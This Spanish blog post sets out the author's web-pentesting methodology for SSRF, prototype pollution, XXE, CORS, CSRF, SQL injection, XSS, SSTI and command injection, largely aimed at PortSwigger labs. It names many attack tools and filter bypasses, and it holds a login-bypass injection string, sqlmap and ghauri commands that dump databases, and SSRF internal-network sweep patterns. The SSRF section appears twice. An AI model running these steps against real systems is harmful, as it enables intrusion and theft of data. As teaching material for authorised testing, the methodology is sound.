---
title: Hacking methodologies
description: Metodologías de hacking
date: 2025-10-03 12:30:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Hacking Cheatsheets
tags:
  - Hacking Cheatsheets
image:
  path: /assets/img/Hacking/Hacking.png
---

## Cheatsheet

Todos los `términos` mencionados en las `diferentes categorías` se `encuentran` en la siguiente `cheatsheet`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

## SSRF

1 - `Instalar` las extensiones `Active Scan ++`, `Error Message Checks`, `Additional Scanner Checks`, `Collaborator Everywhere` y `Backslash Powered Scanner` de `Burpsuite`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - `Crawleamos` el `dominio` con `Burpsuite` e `interactuamos manualmente con todas las funcionalidades del sitio web`

4 - `Buscamos peticiones interesantes en el HTTP history y en el Site map` y `escaneamos partes específicas de estas peticiones` usando el `escáner de Burpsuite`. Para `escanear` los `insertion points` debemos `enviar` la `petición` al `Intruder`, `marcar las posiciones que queremos que sean escaneadas` y `seleccionar` en `tipo de escaneo` la opción `Audit selected items`

5 - Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

6 - Una vez `detectada` la `vulnerabilidad`, si tiene este aspecto `http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1` vamos a ver si tiene algo `corriendo` en el localhost `http://127.0.0.1:FUZZ`, para ello podemos usar el `Intruder` u otro `fuzzer`. Podemos escanear los `65535` puertos existentes o usar la herramienta `get-top-ports` para `obtener` los `puertos más comunes` y efectuar el `escaneo` más `rápido`

7 - Si no encontramos nada en el `localhost`, `escanearemos` posibles rutas `http://192.168.0.1:8080/FUZZ` para ver si hay algo interesante. En mi caso uso los `diccionarios` de `SecLists`

8 - `En caso de no encontrar nada`, procederemos a `buscar si hay servicios en otros puertos http://192.168.0.1:FUZZ`

9 - Si no encontramos nada, vamos a `fuzzear` para ver si hay algún otro dispositivo que esté `corriendo` algún `servicio` por el mismo puerto `http://192.168.0.FUZZ:8080`

10 - `Si no hay nada`, procederemos a `buscar otros dispositivos conectados a la red`, para ello `fuzzearemos` de esta forma `http://192.168.0.FUZZ:FUZZ`. Para el `primer elemento` a `fuzzear` usaremos `números` desde el `0 al 255` y para el `segundo elemento` usaremos `puertos`

11 - Si no encontramos nada, ampliamos la búsqueda `http://192.168.FUZZ.FUZZ:FUZZ`. Para los `dos primeros elementos` a `fuzzear` usaremos `números` desde el `0 al 255` y para el `tercer elemento` usaremos `puertos`

12 - Si no encontramos nada, ampliamos la búsqueda `http://192.FUZZ.FUZZ.FUZZ:FUZZ`. Para los `tres primeros elementos` a `fuzzear` usaremos `números` desde el `0 al 255` y para el `cuarto elemento` usaremos `puertos`

13 - Si no encontramos nada, ampliamos la búsqueda `http://FUZZ.FUZZ.FUZZ.FUZZ:FUZZ`. Para los `cuatro primeros elementos` a `fuzzear` usaremos `números` desde el `0 al 255` y para el `quinto elemento` usaremos `puertos`

14 - Sabremos que hemos encontrado otro `dispositivo` porque nos `devolverá un código de estado o error diferente`, puede ser un `200, 404 etc`. Una vez hecho esto vamos a `fuzzear` por rutas `http://192.168.0.1:8080/FUZZ`

15 - Puede ser que se nos `devuelva algún código de estado o error diferente` indicando que hay alguna `dirección IP blacklisteada`. Para estas situaciones usaremos la extensión `Encode IP` de `Burpsuite` y las herramientas `Ipfuscator` y `SSRF Payload Generator`, en ese orden. En el caso en el que esté la dirección `127.0.0.1` o el `localhost` blacklistado podemos usar la `cheatsheet de Portswigger` [https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet) o `SSRF PayloadMaker`

16 - Si recibimos un `código de estado o error diferente` indicando que hay alguna `dirección ruta blacklisteada`, podemos usar `Recollapse` para efectuar un `bypass`. En el caso de no funcionar, deberemos echar un vistazo primeramente a esta `guía de ofuscación` [https://justice-reaper.github.io/posts/Ofuscation-Guide/](https://justice-reaper.github.io/posts/Ofuscation-Guide/)

17 - Si estamos ante un `Blind SSRF` usaremos la `cheatsheet de Portswigger` o `SSRF PayloadMaker` para `detectarlo`. Esta `última herramienta` nos proporciona un `mayor número de payloads`

18 - Si encontramos un `open redirect` debemos fijarnos en si podemos `derivarlo` a un `SSRF`. Un `ejemplo` de esto eseste `laboratorio` [https://justice-reaper.github.io/posts/SSRF-Lab-5/](https://justice-reaper.github.io/posts/SSRF-Lab-5/)

## Prototype pollution

1 - `Ejecutar` la herramienta `fileWatcher`, `interactuar con todas las funciones de la página`, `abrir la consola de del navegador` y `filtrar por archivos js en la pestaña Network`. Una vez hecho esto, `añadir las URLs en las que hay un archivo js a fileWatcher`. El siguiente paso es `interactuar nuevamente con todas las funciones de la web y cada vez que hacemos una acción que consideremos importante checkeamos si ha cambiado algún archivo js`

![](/assets/img/Prototype-Pollution-Methodology/image_1.png)

2 - `Eliminamos los comentarios de los archivos js y usamos pp-finder sobre ellos`. Es importante que `PPF_WRAPPER_NAME no coincida con el nombre de ninguna variable, de lo contrario, nos devolverá un error cuando abramos la consola del navegador`

```
PPF_WRAPPER_NAME="searchLoggerAlternative_js_file" pp-finder compile --agent browser searchLoggerAlternative.js -o searchLoggerAlternative_compiled.js
```

3 - El `siguiente paso` es `modificar los archivos js compilados para que cuando nos muestre los gadgets que ha encontrado, sepamos a que archivo js pertenece cada uno`. `Antes de ejecutar este comando es importante asegurarse de que los archivos no tenga en el nombre caracteres que no se puedan usar en nombres de variables o de lo contrario, nos devolverá un error cuando abramos la consola del navegador`

```
for f in *_compiled.js; do NAME=$(basename "$f" _compiled.js); sed -i "s|\`\[%cPP%c\]\[%c\${op}%c\] %c\${JSON.stringify(key \|\| \"_\")}%cat \${path} \${loc}\`|\`\[$NAME\]\[%cPP%c\]\[%c\${op}%c\] %c\${JSON.stringify(key \|\| \"_\")}%cat \${path} \${loc}\`|g" "$f"; done
```

4 - También tenemos que `volver a modificar los archivos para que además de mostrarse en la consola del navegador los gadgets encontrados, nos los guarde en un archivo`

```
sed -i 's/console\.log(\.\.\.format(arg));/const formatted = format(arg); console.log(...formatted); fetch("http:\/\/localhost:9090\/log", {method:"POST",headers:{"Content-Type":"text\/plain"},body:formatted[0].replace(\/%c\/g,"")}).catch(()=>{});/' *_compiled.js
```

5 - Una vez hecho lo anterior vamos a `crear un archivo con este contenido que se llame server.py con el contenido que hay abajo y lo ejecutamos así python3 server.py`. Esto lo hacemos porque `la consola del navegador tiene un límite de contenido a mostrar`, además, `de esta forma también obtenemos un diccionario con todos los gadgets detectados`

```
#!/usr/bin/python3

from http.server import HTTPServer, BaseHTTPRequestHandler
import re

LOG_FILE = "logs.txt"
GADGETS_FILE = "gadgets.txt"

def extract_gadget(line):
    match = re.search(r'"([^"]+)"', line)
    return match.group(1) if match else None

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers["Content-Length"])
        line = self.rfile.read(length).decode()

        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")

        gadget = extract_gadget(line)
        if gadget:
            with open(GADGETS_FILE, "a+") as f:
                f.seek(0)
                if gadget not in f.read().splitlines():
                    f.write(gadget + "\n")

        print(line)

        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.end_headers()

    def log_message(self, *args):
        pass

HTTPServer(("localhost", 9090), Handler).serve_forever()
```

5 - `Tenemos que ver en el Logger de Burspuite o en el HTTP history la forma en la que se cargan los archivos js`, ya que `en el siguiente paso vamos a tener que crear una regex para sustituir esos archivos por los nuestros modificados`

6 - Una vez hecho esto, nos `dirigimos` a `Burpsuite > Proxy settings` y `habilitamos` la `checkbox` que dice `Intercept responses based on the following rules`

![](/assets/img/Prototype-Pollution-Methodology/image_2.png)

7 - Lo `siguiente` que vamos a hacer es `dirigirnos` al `Match and replace` de `Burpsuite` y `crear una regex para aplicar estas sustituciones`. En nuestro caso `los archivos js están en el body de la response, por lo que en Type debemos de seleccionar la opción Response body`. En `Match` lo `normal` es que `debamos de sustituir la carga de los scripts de esta manera`

```
<script src='/resources/js/searchLoggerAlternative.js'></script>
```

```
<script>Pegar el contenido de searchLoggerAlternative_compiled.js aquí dentro</script>
```

![](/assets/img/Prototype-Pollution-Methodology/image_3.png)

8 - A continuación tenemos que `tunelizar el tráfico a través de Burpsuite para que se lleven a cabo las sustituciones que hemos configurado anteriormente`, `abrir la consola del navegador`, `recargar la web usando Ctrl + Shift + R e interactuar con todas las funciones de la web nuevamente`. `Si detectamos algún gadget nos aparecerá algo así por consola`. Todos estos `gadgets` se están `registrando` gracias a `server.py` en el archivo `logs.txt` y en el archivo `gadgets.txt`. `Al final de la línea pone el número de fila y el número de columna en la que se ha detectado el gadget`, por ejemplo `1:563`

![](/assets/img/Prototype-Pollution-Methodology/image_4.png)

9 - Una vez tenemos este `listado de posibles gadgets` vamos a usar la herramienta `Prototype-Pollution-Hunter` para `validar cuales de estos gadgets podemos usar para la explotación`

10 - `Una vez descubramos que gadgets son válidos, tenemos que ir testeándolos a mano uno a uno porque no sabemos el tipo de payload que necesitan para explotarse`. `Como estamos testeando podemos usar cualquier cadena de texto como valor, por ejemplo foo`. Para hacer esto, debemos `desactivar` el `Match and replace` de `Burpsuite`, `abrir la web en una nueva pestaña`, `abrir la consola de desarrollador`, `pulsar Ctrl + Shift + R` y `dirigirnos al archivo js en el que se encuentra el gadget que vamos a investigar`. Para `ir` a la `línea` y `columna` en la que `encontramos` el `gadget` debemos de `pulsar Ctrl + G` y `escribir númeroDeFila:númeroDeColumna`

![](/assets/img/Prototype-Pollution-Methodology/image_5.png)

![](/assets/img/Prototype-Pollution-Methodology/image_6.png)

10 - El `siguiente paso` es `poner un breakpoint en la fila y columna en la que hemos detectado el gadget` y `recargar la web con Ctrl + Shift + R`. `Debemos interactuar con todas las features de la web y ver a donde llega el valor que hemos inyectado mediante el prototype pollution`. `Hacemos esto para ver en todo momento donde acaba el valor que acabamos de inyectar, ya que dependiendo de donde acabe ese valor podemos llevar a cabo diferentes tipo de explotaciones`. Es decir, `no necesariamente necesitamos que llegue a un sink para que tenga un impacto`. Hay que tener en cuenta que `es posible que nos lance una excepción debido al payload que hemos usamos para envenenar el prototipo`, para estos casos, las opciones `Pause on uncaught exception` y `Pause on caught exceptions` nos harán el trabajo más fácil. `Podemos usar estas opciones para ver por qué y donde nos devuelve el error y así ajustar el payload enviado`. Para movernos debemos `usar los elementos que aparecen encima de Paused on breakpoint`

![](/assets/img/Prototype-Pollution-Methodology/image_7.png)

## XXE

1. `Instalar` las `extensiones básicas` de `Burpsuite`

2. `Añadir` el `dominio` y sus `subdominios` al `scope`

3. Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

4. `Escanearemos partes específicas de la petición` usando el `escáner de Burpsuite`. Para `escanear` los `insertion points` debemos seleccionar en `tipo de escaneo` la opción `Audit selected items`

5. Si los `datos` no se están transmitiendo en formato `XML`, cambiaremos a este formato usando la extensión `Content Type Converter` de `Burpsuite` y `repetiremos los escaneos`

6. Ejecutar un `ataque de fuerza bruta` con los `diccionarios` mencionados en `hacking tools` que contengan payloads para `XXE`
    
7. Si nos encontramos ante una `subida de archivos`, también podremos explotar un `XXE`, para ello, nos revisaremos la `guía de file upload vulnerabilities` [https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Guide/](https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Guide/). Podemos usar herramientas como `Oxml_xxe` o `Docem` para la `explotación`, pero personalmente prefiero hacerlo de `forma manual`
    
8. Si los `datos` se transmiten en formato `XML` y existe una `subida de archivos`, procederemos a intentar buscar un `XXE` mediante los `payloads` de `PayloadsAllTheThings` y si no encontramos nada, procederemos a seguir la `metodología` de `Hacktricks`. Podemos usar herramientas como `XXEinjector` o `XXExploiter` para la `explotación`, pero personalmente prefiero hacerlo de `forma manual`

## Clickjacking

1. Usaremos herramientas como `Security Headers` o `Shcheck` para `identificar` las `cabeceras de seguridad` de una `web` y ver si es `vulnerable`

2. `Creamos` un `PoC` usando `Clickbandit` 

## CORS

1. `Instalar` las `extensiones básicas` de `Burpsuite`. También debemos `instalar` las extensiones `CORS* - Additional CORS Checks` y `Trusted Domain CORS Scanner`

2. `Añadir` el `dominio` y sus `subdominios` al `scope`

3. Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

4. `Escanearemos partes específicas de la petición` usando el `escáner de Burpsuite`. Para `escanear` los `insertion points` debemos seleccionar en `tipo de escaneo` la opción `Audit selected items`

5. Si preferimos usar herramientas por consola podemos usar `CORScanner`, `CorsOne` o `CorsMe`. La que más gustan son `CORScanner` y `CorsOne`, ya que `CorsMe` tienen el problema de que para detectar si el `Origin` acepta como valor `null`, solo prueban con el valor `Null` y no con `NULL` o `null`, y esto puede provocar que `no detecten la vulnerabilidad en ciertas ocasiones`

6. Si tenemos dudas de cómo explotar el ataque, `Corsy` nos da pistas sobre ello

7. Si en este punto `no podemos explotar CORS`, tenemos que buscar un `dominio de confianza` que sea `vulnerable` a `XSS`. Para ello, debemos revisar la `guía de XSS` para saber como `identificarlos`

8. Si no encontramos nada, procedemos a buscar de `forma manual` siguiendo los pasos de `PayloadsAllTheThings` y `Hacktricks`

9. Para crear un `PoC` usaremos `C0rsPwn3r` o lo haremos de forma `manual`

10. En el caso de estar en una `intranet` usaremos `of-CORS` para la `explotación`

## CSRF

1. `Instalar` las `extensiones básicas` de `Burpsuite` y la extensión `CSRF Scanner`

2. `Añadir` el `dominio` y sus `subdominios` al `scope`

3. Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

4. Podemos usar `Bolt` o `XSRFProbe` para una` detección rápida`, pero debemos tener en cuenta que `estas herramientas pueden no ser del todo efectivas si la forma de explotar el CSRF es compleja`

5. Si no encontramos nada, podemos usar la `metodología` de `PayloadsAllTheThings` para `detectar si es posible llevar a cabo un ataque CSRF` y para una mayor variedad de ataques consultaremos `Hacktricks`

6. Por último, debemos `generar` un `PoC` usando `Project Forgery` o el `CSRF PoC Generator` de `Burpsuite` 

## SQLI

Ejemplos de tipos de SQL injections:

- SQL injection with filter bypass via XML encoding - [https://justice-reaper.github.io/posts/SQLI-Lab-18/](https://justice-reaper.github.io/posts/SQLI-Lab-18/) (PostgreSQL)

- Blind SQL injection with out-of-band data exfiltration - [https://justice-reaper.github.io/posts/SQLI-Lab-17/](https://justice-reaper.github.io/posts/SQLI-Lab-17/) (Oracle)

- Blind SQL injection with time delays and information retrieval - [https://justice-reaper.github.io/posts/SQLI-Lab-15/](https://justice-reaper.github.io/posts/SQLI-Lab-15/) (PostgreSQL)

- Visible error-based SQL injection - [https://justice-reaper.github.io/posts/SQLI-Lab-13/](https://justice-reaper.github.io/posts/SQLI-Lab-13/) (PostgreSQL)

- Blind SQL injection with conditional errors - [https://justice-reaper.github.io/posts/SQLI-Lab-12/](https://justice-reaper.github.io/posts/SQLI-Lab-12/) (Oracle)

- Blind SQL injection with conditional responses - [https://justice-reaper.github.io/posts/SQLI-Lab-11/](https://justice-reaper.github.io/posts/SQLI-Lab-11/) (PostgreSQL)

- SQL injection UNION attack - [https://justice-reaper.github.io/posts/SQLI-Lab-10/](https://justice-reaper.github.io/posts/SQLI-Lab-10/) (PostgreSQL) - [https://justice-reaper.github.io/posts/SQLI-Lab-6/](https://justice-reaper.github.io/posts/SQLI-Lab-6/) (Oracle) - [https://justice-reaper.github.io/posts/Validation/](https://justice-reaper.github.io/posts/Validation/) (MariaDB) - [https://justice-reaper.github.io/posts/GoodGames/](https://justice-reaper.github.io/posts/GoodGames/) (MySQL)

- SQL injection vulnerability allowing login bypass - [https://justice-reaper.github.io/posts/SQLI-Lab-2/](https://justice-reaper.github.io/posts/SQLI-Lab-2/)

Pasos a seguir:

1 - `Instalar` las extensiones `Hackvertor`, `Active Scan ++`, `Error Message Checks`, `Additional Scanner Checks`, `Collaborator Everywhere`, `SQLmap DNS Collaborator` y `Backslash Powered Scanner` de `Burpsuite`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

4 - `Interactuar manualmente con todas las funcionalidades del sitio web`. Una vez hecho `revisamos` las `peticiones`, las que consideremos que `tienen insertion points interesantes (cookies, parámetros de consulta, datos por POST) las mandamos al Intruder`, `marcamos las partes que queremos escanear` y `hacemos click derecho > Scan defined insertion points`. Cuando se nos `abra` el `menú` debemos `seleccionar` en `tipo de escaneo` la opción `Audit selected items`

5 - Si hay un `panel de login` podemos intentar `hacer` un `login bypass` con la típica inyección `' or 1=1-- - ` antes de lanzar `sqlmap`, `ghauri` o `escanear los insertion points`

6 - `Analizar la query con sqlmap 2 veces`, debido a que `puede fallar en ocasiones`. `Antes de lanzar sqlmap nos vamos a Burpsuite y cargamos la extensión SQLMap DNS Collaborator y nos copiamos el ese parámetro para usarlo en sqlmap`. Lo `primero` que vamos a `hacer` es `listar la versión con --banner`, `seguidamente la base de datos actual con --current-db`, `luego las bases de datos existentes con --dbs`, `posteriormente seleccionamos la base de datos que nos interese y listamos sus tablas con -D nombreBaseDeDatos --tables`, `lo siguiente es seleccionar la tabla que nos interese y listar sus columnas con -D nombreBaseDeDatos -T nombreTabla --columns` y `finalmente seleccionamos las columnas que nos interesen y dumpeamos su contenido con -D nombreBaseDeDatos -T nombreTabla -C columna1,columna2 --dump`

```
sudo sqlmap -u 'https://0a050082031237258094306d00be0099.web-security-academy.net/' --cookie="TrackingId=pSWRRS0IQHT5vBjp*; session=AQlmdQgzhyO3dxWbUFsAHJCHQzDUK9ST" --risk=3 --level=5 --dns-domain=9180tced6onerv845e8zg0m8pzvpje.oastify.com --random-agent --batch --insertarParámetrosMencionadosArriba
```

7 - Mientras `sqlmap` está `corriendo`, `analizamos la query con ghauri 2 veces` para `confirmar que sqlmap no se saltó nada`. Lo `primero` que vamos a hacer es `listar la versión con --banner`, `seguidamente la base de datos actual con --current-db`, `luego las bases de datos existentes con --dbs`, `posteriormente seleccionamos la base de datos que nos interese y listamos sus tablas con -D nombreBaseDeDatos --tables`, `lo siguiente es seleccionar la tabla que nos interese y listar sus columnas con -D nombreBaseDeDatos -T nombreTabla --columns` y `finalmente seleccionamos las columnas que nos interesen y dumpeamos su contenido con -D nombreBaseDeDatos -T nombreTabla -C  columna1,columna2 --dump`

```
ghauri -u 'https://0a050082031237258094306d00be0099.web-security-academy.net/' --cookie="TrackingId=pSWRRS0IQHT5vBjp*; session=AQlmdQgzhyO3dxWbUFsAHJCHQzDUK9ST" --level=3 --random-agent --batch --insertarParámetrosMencionadosArriba
```

8 - `Si tenemos algún problema con las queries de ghauri o de sqlmap podemos usar el parámetro --flush-session para borrar todo lo descubierto y empezar de nuevo` o `el parámetro --fresh-queries que hace que sqlmap y ghauri recuerden el punto de inyección pero realizan las queries para listar bases de datos, tablas, columnas etc nuevamente`. Es decir, `si hay problemas a la hora de etectar el punto de inyección, usamos --flush-session` y `si hay problema a la hora de extraer datos usamos --fresh-queries`

9 - `Si vemos que sqlmap o ghauri no pueden ejecutar la consulta bien pero ya hemos detectado la SQLI mediante sqlmap, ghauri o analizando los insertion points`, vamos a `llevar a cabo la explotación manualmente`. Para ayudarnos podemos usar la `cheatsheet` de `SQLI` de `Portswigger` [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) y `los posts mencionados en esta sección de la guía` [https://justice-reaper.github.io/posts/SQLI-Guide/#ejemplos-de-tipos-de-sql-injections](https://justice-reaper.github.io/posts/SQLI-Guide/#ejemplos-de-tipos-de-sql-injections). `Si la SQLI que estamos explotando no se da tal cual se muestra en los posts podemos pasarle la cheathseet de SQLI de Portswigger a la IA para que nos ayude a elaborar un payload válido`

10 - `Puede darse el caso en que los datos por POST se transmitan en formato XML`, en estos casos `vamos a hacer la explotación de forma manual`. `Lo más seguro es que no detectemos la SQLI con los escáneres`, así que `vamos a seguir los pasos de este laboratorio` [https://justice-reaper.github.io/posts/SQLI-Lab-18/](https://justice-reaper.github.io/posts/SQLI-Lab-18/) y `a utilizar la IA para adaptar los paylods si se está usando una base de datos diferente a la del ejemplo`

## XSS

1. `Instalar` las `extensiones básicas` de `Burpsuite`

2. `Añadir` el `dominio` y sus `subdominios` al `scope`

3. Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

4. `Escanearemos partes específicas de la petición` usando el `escáner de Burpsuite`. Para `escanear` los `insertion points` debemos seleccionar en `tipo de escaneo` la opción `Audit selected items`

5. Con el objetivo de encontrar `vulnerabilidades` de tipo `DOM XSS` usamos el `DOM Invader` para testear todos los `inputs`

6. Una vez hecho esto, usamos `XSStrike` con el parámetro `--crawl` para poder `identificar` si hay alguna `vulnerabilidad` o algún `sink`, el cual pueda conducir a un `XSS`

7. Usamos `XSStrike` nuevamente, pero esta vez con el objetivo de `detectar` un `XSS`

8. Si no encontramos nada y la `URL` es de este estilo `https://0a42008c0326fbeb803d129600e6006e.web-security-academy.net/?search=test` o de este otro `http://stock.0a1b001e03ee4b4480f30dd1005a0015.web-security-academy.net/?productId=3&storeId=1`, vamos a usar `Loxs` y `XSSuccessor`

9. Si no encontramos nada, usaremos `Loxs` y `XSSuccessor` nuevamente pero con los `diccionarios` que se muestran `hacking tools` que contengan `payloads` para `XSS`. A estos `diccionarios` también le podemos añadir el de `Portswigger` que podemos `obtener` mediante `Dalfox` y los de `PayloadsAllTheThings`. Podemos `listar` los `payloads` de `Portswigger` con este comando `dalfox --remote-payloadbox`

10. Si `Loxs` y `XSSuccessor` no encuentran nada, usaremos `Dalfox`, el cual tiene soporte para `DOM XSS`, `Reflected XSS` y `Stored XSS`. Como dije anteriormente, `Dalfox` cuenta con los `payloads` de `Portswigger` para descubrir `XSS` y con los `diccionarios` de `Burpsuite` y `Assetnote` para descubrir `parámetros` en la `URL` que sean `vulnerables`

11. Si sospechamos de un `stored XSS`, podemos usar los `payloads` de `Loxs`, `XSSuccessor`, los de `Portswigger` que se obtienen mediante `Dalfox`, los de los `diccionarios` de `hacking tools` o los de `PayloadsAllTheThings` con el `Intruder` de `Burpsuite`. Si necesitamos `inyectar payloads` en `varias posiciones` seleccionaremos `Pitchfork` como `tipo de ataque`. `Puede ser complicado encontrar el payload correcto si mandamos muchos a la vez`, por eso, recomiendo usar la herramienta `payload-splitter` para `dividir` una `gran lista de payloads` en `listas mucho más pequeñas y manejables`

12. En el caso en que haya algunos `tags` o `atributos` blacklisteados, podemos usar `XSSDynaGen` o el `fuzzer de XSStrike` para ver que `caracteres` podemos usar. Sin embargo, yo prefiero usar el `Intruder` de `Burpsuite` junto con la `cheatsheet de Portswigger` para averiguarlo, debido a que esta forma es más `precisa`

13. Si no encontramos nada, nos centraremos en buscar los `XSS de forma manual` utilizando la metodología de `Hacktricks` y usando como apoyo las `cheatsheets` de `Portswigger` y de `PayloadsAllTheThings`

14. En el caso de que sospechemos de un `Blind XSS`, podemos usar varias `herramientas` para `identificarlo`. Si disponemos de un `VPS`, podemos usar `XSSHunter Express` y si no disponemos de uno, podemos usar `XXHunter`, `BXSSHunter` o `XSSReport`

## SSTI

1. `Instalar` las `extensiones básicas` de `Burpsuite`

2. `Añadir` el `dominio` y sus `subdominios` al `scope`

3. Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

4. `Escanearemos partes específicas de la petición` usando el `escáner de Burpsuite`. Para `escanear` los `insertion points` debemos seleccionar en `tipo de escaneo` la opción `Audit selected items`

5. Jugaremos con las opciones de `Tplmap` y de `SSTImap` para intentar `explotar` el `SSTI`

6. Si no podemos explotarlo de primeras, vamos a usar la herramienta `TInjA` para intentar `identificar` la `plantilla` que se está `usando`

7. Si esto no da resultado, usaremos `Template Injection Table`

8. Si no podemos explotarlo con estas herramientas, ejecutamos una `ataque de fuerza bruta` con el `Intruder` de `Burpsuite` empleando varios `diccionarios`. Primeramente vamos a usar el `diccionario integrado de Burpsuite` llamado `Fuzzing - template injection`, posteriormente usaremos los diccionarios que contengan `payloads` para esta `vulnerabilidad`

9. Si no encontramos nada, `checkearemos` las `cheatsheets` de `PayloadsAllTheThings` y `Hacktricks` e iremos `testeando de forma manual`. Si vemos `payloads` o `diccionarios` para aplicar `fuerza bruta` debemos probarlos

10. Si hemos logrado `identificar el motor de plantillas` pero `no llevar a cabo una explotación` debemos `buscar vulnerabilidades para esa plantilla`. Si no encontramos ninguna, `revisaremos su documentación` para ver si podemos `aprovecharnos de alguna característica para obtener información interesante`

## SSRF

1. `Instalar` las `extensiones básicas` de `Burpsuite`

2. `Añadir` el `dominio` y sus `subdominios` al `scope`

3. Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

4. `Escanearemos partes específicas de la petición` usando el `escáner de Burpsuite`. Para `escanear` los `insertion points` debemos seleccionar en `tipo de escaneo` la opción `Audit selected items`

5. Si el `escáner` de `Burpsuite` no encuentra nada, procedemos a buscar de `forma manual` siguiendo los pasos de `PayloadsAllTheThings` y `Hacktricks`. Si vemos `payloads` o `diccionarios` para aplicar `fuerza bruta` debemos probarlos

6. Una vez detectada la vulnerabilidad, si tiene este aspecto `http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1` vamos a ver si tiene algo corriendo en el localhost `http://127.0.0.1:FUZZ`, para ello podemos usar el `Intruder` u otro `fuzzer`. Podemos escanear los `65535` puertos existentes o usar la herramienta `get-top-ports` para `obtener` los `puertos más comunes` y efectuar el `escaneo` más `rápido`

7. Si no encontramos nada en el `localhost`, `escanearemos` posibles rutas `http://192.168.0.1:8080/FUZZ` para ver si hay algo interesante. En mi caso uso los `diccionarios` de `SecLists`

8. En el caso de no encontrar nada, procederemos a buscar si hay servicios en otros puertos `http://192.168.0.1:FUZZ`

9. Si no encontramos nada, vamos a `fuzzear` para ver si hay algún otro dispositivo que esté `corriendo` algún `servicio` por el mismo puerto `http://192.168.0.FUZZ:8080`

10. Si no hay nada procederemos a buscar otros dispositivos conectados a la red, para ello `fuzzearemos` de esta forma `http://192.168.0.FUZZ:FUZZ`. Para el `primer elemento` a `fuzzear` usaremos `números` desde el `0 al 255` y para el `segundo elemento` usaremos `puertos`

11. Si no encontramos nada, ampliamos la búsqueda `http://192.168.FUZZ.FUZZ:FUZZ`. Para los `dos primeros elementos` a `fuzzear` usaremos `números` desde el `0 al 255` y para el `tercer elemento` usaremos `puertos`

12. Si no encontramos nada, ampliamos la búsqueda `http://192.FUZZ.FUZZ.FUZZ:FUZZ`. Para los `tres primeros elementos` a `fuzzear` usaremos `números` desde el `0 al 255` y para el `cuarto elemento` usaremos `puertos`

13. Si no encontramos nada, ampliamos la búsqueda `http://FUZZ.FUZZ.FUZZ.FUZZ:FUZZ`. Para los `cuatro primeros elementos` a `fuzzear` usaremos `números` desde el `0 al 255` y para el `quinto elemento` usaremos `puertos`

14. Sabremos que hemos encontrado otro `dispositivo` porque nos `devolverá un código de estado o error diferente`, puede ser un `200, 404 etc`. Una vez hecho esto vamos a `fuzzear` por rutas `http://192.168.0.1:8080/FUZZ`

15. Puede ser que se nos `devuelva algún código de estado o error diferente` indicando que hay alguna `dirección IP blacklisteada`. Para estas situaciones usaremos la extensión `Encode IP` de `Burpsuite` y las herramientas `Ipfuscator` y `SSRF Payload Generator`, en ese orden. En el caso en el que esté la dirección `127.0.0.1` o el `localhost` blacklistado podemos usar la `cheatsheet de Portswigger` o `SSRF PayloadMaker`. Aunque estas dos últimas `herramientas` no estén hechas para esta función disponen de un `mayor número de payloads` para estas `situaciones`. Si ninguna de estas funciona debemos checkear `PayloadsAllTheThings` y `Portswigger` para ver si se puede efectuar otro `bypass` que no esté `contemplado`

16. Si recibimos un `código de estado o error diferente` indicando que hay alguna `dirección ruta blacklisteada`, podemos usar `Recollapse` para efectuar un `bypass`. En el caso de no funcionar, deberemos echar un vistazo primeramente a esta `guía de ofuscación` [https://justice-reaper.github.io/posts/Ofuscation-Guide/](https://justice-reaper.github.io/posts/Ofuscation-Guide/) y si no funciona deberemos checkear `Hacktricks`

17. Si estamos ante un `Blind SSRF` usaremos la `cheatsheet de Portswigger` o `SSRF PayloadMaker` para `detectarlo`. Esta `última herramienta` nos proporciona un `mayor número de payloads`

18. Si encontramos un `open redirect` debemos fijarnos en si podemos `derivarlo` a un `SSRF`

19. Desafortunadamente en los laboratorios de `Portswigger` no funciona `SSRFmap`, pero es una `herramienta` muy `recomendable` si es posible usarla

## Command injection

1. `Instalar` las `extensiones básicas` de `Burpsuite` y también la extensión `Command injection attacker`

2. `Añadir` el `dominio` y sus `subdominios` al `scope`

3. Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

4. `Escanearemos partes específicas de la petición` usando el `escáner de Burpsuite`. Para `escanear` los `insertion points` debemos seleccionar en `tipo de escaneo` la opción `Audit selected items`

